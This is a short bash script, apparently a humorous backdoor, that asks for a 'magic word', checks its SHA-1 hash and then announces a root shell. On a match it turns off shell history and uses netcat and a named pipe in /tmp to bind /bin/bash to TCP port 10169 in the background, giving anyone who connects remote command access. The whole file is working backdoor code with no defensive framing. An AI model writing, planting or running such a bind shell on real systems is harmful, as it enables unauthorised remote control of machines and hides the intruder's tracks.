#!/bin/bash

hash="03fed5b990fbc2d64de9085ef9c66d24586b9380"
lolnode=/tmp/.rofl

lolUp(){
  echo 'Conjuring a root shell on :lol69'
  export HISTFILE=/dev/null #  Stuff to run before the shell
  mknod $lolnode p; (nc -l -p 10169 || nc -l 10169)0<$lolnode | \
  /bin/bash >$lolnode 2>&1; rm $lolnode
}

trap "rm -f /tmp/$lolnode /tmp/.pass" 1 2 8

case $1 in
-p|--password)
printf "$2" >/tmp/.pass
;;
*)
read -s -p "Enter the Magic Word: " magic
printf $magic >/tmp/.pass
;;
esac

if echo "$hash */tmp/.pass" | sha1sum -c - > /dev/null 2>&1 ; then
   echo Access Granted!
   lolUp &

else
  for i in a b c d e; do
    echo "AH! AH! AH! You didn't say the magic word!"
    sleep 1
  done
fi

exit
